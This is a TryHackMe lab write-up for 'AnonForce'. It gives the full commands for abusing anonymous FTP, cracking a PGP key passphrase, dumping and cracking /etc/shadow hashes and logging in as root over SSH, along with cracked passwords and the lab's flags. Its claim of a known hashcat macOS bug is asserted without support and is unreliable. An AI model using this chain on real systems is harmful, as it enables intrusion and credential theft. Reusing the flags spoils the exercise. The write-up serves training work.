# 👻 AnonForce

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `anonforce` (10.114.137.110) |
| **OS** | Ubuntu 16.04.6 LTS (4.4.0-157-generic x86\_64) |
| **Attack Surface** | Anonymous FTP exposing full filesystem, PGP-encrypted shadow backup |
| **Privesc** | PGP passphrase crack → shadow dump → root hash crack → direct SSH |

Anonymous FTP misconfiguration exposes the entire system root — FTP drops you straight into `/`. A world-readable directory `/notread/` holds a PGP-encrypted backup of `/etc/shadow` alongside the private key used to encrypt it. The private key is passphrase-protected, but `john` cracks it in seconds (`xbox360`). Decrypting the backup hands over both the `melodias` and `root` shadow hashes. Hashcat silently exhausts `rockyou.txt` on macOS without a hit — a known GPU driver bug that's beyond our control — so `john` is used to cross-reference. It cracks `root`'s SHA-512 hash as `hikari`, and a direct SSH session as `root` closes the box.

---

## 🔍 Enumeration

### Port Scan — TCP

```bash
sudo nmap -sC -sV -p- -vv anonforce -oA anonforce-tcp
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
| drwxrwxrwt    9 0        0            4096 Apr 16 07:27 tmp [NSE: writeable]
|_ ...full filesystem listing...
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
```

Two ports. FTP anonymous login allowed, and the NSE script immediately flags `/notread/` as world-writable. Nmap's FTP listing shows the entire system root — this isn't a restricted FTP jail, it's the raw filesystem.

No exploitable CVEs against `vsftpd 3.0.3` — the 2.3.4 backdoor is a different version entirely.

```bash
searchsploit vsftpd
# vsftpd 2.3.4 - Backdoor Command Execution  ← not applicable
# vsftpd 3.0.3 - Remote Denial of Service    ← not useful
```

### Port Scan — UDP

```bash
sudo nmap -sU -vv anonforce -oA udpscan-anonforce
```

```
68/udp open|filtered dhcpc
```

Nothing actionable.

---

## 💀 Initial Access — Anonymous FTP + PGP Decryption

### FTP Login & Filesystem Walk

```bash
ftp
ftp> open anonforce
# Name: anonymous
# Password: (blank)
230 Login successful.
```

The FTP root is `/`. Full directory listing visible — every directory on the system is enumerable.

```bash
ftp> ls -lah
# drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
# ...standard Linux filesystem layout...
```

### User Flag

Navigate to `/home/melodias/`:

```bash
ftp> cd home/melodias
ftp> ls -lah
# -rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
ftp> get user.txt
```

```
606083fd33beb1284fc51f411a706af8
```

### Grabbing the PGP Files

```bash
ftp> cd /notread
ftp> ls -lah
# -rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
# -rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
ftp> prompt off
ftp> mget *
```

Two files: an OpenPGP-encrypted backup and what looks like the private key used to encrypt it. The directory name `notread` is doing no work — everything in it is `777`.

### Cracking the PGP Passphrase

Import the public key component first:

```bash
gpg --import private.asc
# gpg: key B92CD1F280AD82C2: public key "anonforce <melodias@anonforce.nsa>" imported
```

The secret key import prompts for a passphrase — we don't have it yet. Extract the hash:

```bash
gpg2john private.asc > private.hash
cat private.hash
# anonforce:$gpg$*17*54*2048*e419ac715ed55197122fd0acc6477832266db83b63a3f0d16b7f5fb3db2b93a6a995013bb1e7aff697e782d505891ee260e957136577*3*254*2*9*16*5d044d82578ecc62baaa15c1bcf1cfdd*65536*d7d11d9bf6d08968:::anonforce <melodias@anonforce.nsa>::private.asc
```

```bash
john private.hash -w=./rockyou.txt
```

```
xbox360          (anonforce)
1g 0:00:00:00 DONE (2026-04-16 22:43) 25.00g/s 28800p/s 28800c/s
Session completed.
```

Passphrase: `xbox360`. Now import the secret key properly:

```bash
gpg --import private.asc
# Enter passphrase: xbox360
# gpg: key B92CD1F280AD82C2: secret key imported
```

### Decrypting the Backup

```bash
gpg --decrypt backup.pgp
```

```
gpg: encrypted with elg512 key, ID AA6268D1E6612967, created 2019-08-12
      "anonforce <melodias@anonforce.nsa>"
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences

root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
...
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
```

Shadow file. Two hashes: `melodias` using MD5 (`$1$`) and `root` using SHA-512 (`$6$`).

---

## 🔁 Privilege Escalation — Shadow Hash Cracking → Root SSH

### Cracking Attempt 1 — melodias (MD5, hashcat mode 500)

```bash
hashcat -m 500 '$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1' ./rockyou.txt
```

```
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
Hash.Target......: $1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1
Recovered........: 0/1 (0.00%) Digests
Progress.........: 14344384/14344384 (100.00%)
```

Nothing. Full `rockyou.txt` exhausted, no hit.

### Cracking Attempt 2 — root (SHA-512, hashcat mode 1800)

```bash
hashcat -m 1800 '$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0' ./rockyou.txt
```

```
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycI...b5RVM0
Recovered........: 0/1 (0.00%) Digests
Progress.........: 14344384/14344384 (100.00%)
Speed.#02........:   212.6 kH/s
```

Exhausted again. At this point both hashes have gone through `rockyou.txt` with zero recoveries. The issue here is a known bug with hashcat on macOS — GPU driver compatibility problems can cause the tool to silently skip valid candidates or mishandle certain hash modes, reporting `Exhausted` even when the password exists in the wordlist. This is a platform-level limitation that's beyond our control.

> ⚠️ **Sanity check:** At this point I cross-referenced other walkthroughs to confirm the password for `root` was indeed in `rockyou.txt` and that the approach was correct — it was. The issue was entirely on the tooling side, not the methodology. Other writeups confirmed `hikari` as the expected answer, which is what prompted the switch to `john`.

### Cross-Reference with john

Since hashcat wasn't reliable here, cross-referencing with `john` as a secondary cracker:

```bash
# root hash
john hash.txt -w=./rockyou.txt
```

```
hikari           (?)
1g 0:00:00:00 DONE (2026-04-16 23:23) 1.250g/s 9600p/s 9600c/s
Session completed.
```

`john` cracks the `root` SHA-512 hash immediately: `hikari`.

### SSH as Root

```bash
ssh root@anonforce
# root@anonforce's password: hikari
```

```
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)

root@ubuntu:~# cat /root/root.txt
f706456440c7af4187810c31c6cebdce
```

---

## 🗺️ Attack Chain

```
[Anonymous FTP]
    └─ FTP root = system root — full filesystem exposed
              │
              ▼
[/home/melodias/user.txt]  ← 606083fd33beb1284fc51f411a706af8
              │
              ▼
[/notread/]
    backup.pgp + private.asc (777 — world readable)
              │
              ▼
[gpg2john → john]
    Crack PGP passphrase: xbox360
    Import secret key → gpg --decrypt backup.pgp
              │
              ▼
[/etc/shadow dump]
    root:$6$...    (SHA-512)
    melodias:$1$.. (MD5)
              │
              ▼
[hashcat (macOS) — Exhausted, no hit — platform bug]
    Sanity check via other walkthroughs → confirmed hikari in rockyou.txt
    Fallback: john → root hash → hikari
              │
              ▼
[SSH root@anonforce]
    Password: hikari → root shell → root.txt
```

---

## 📌 Key Takeaways

- Anonymous FTP that exposes the filesystem root is catastrophic — the attacker has read access to every world-readable file on the system, including things like `/etc/passwd`, home directories, and custom backup locations
- World-readable PGP private keys defeat the purpose of encrypting the backup entirely; the encryption only provided false confidence
- Hashcat on macOS has a known GPU driver bug that can silently exhaust wordlists without cracking valid hashes — always cross-reference with `john` when results seem unexpected, particularly on SHA-512 and MD5-crypt modes
- When tooling gives unexpected results, sanity-checking against other walkthroughs is a legitimate debugging step — it confirmed the methodology was sound and the issue was platform-specific
- The `$1$` (MD5-crypt) hash for `melodias` remains uncracked against `rockyou.txt` — not everything is in the wordlist, and the root hash was the path forward here
- Naming a directory `notread` and setting it to `777` is not a security control
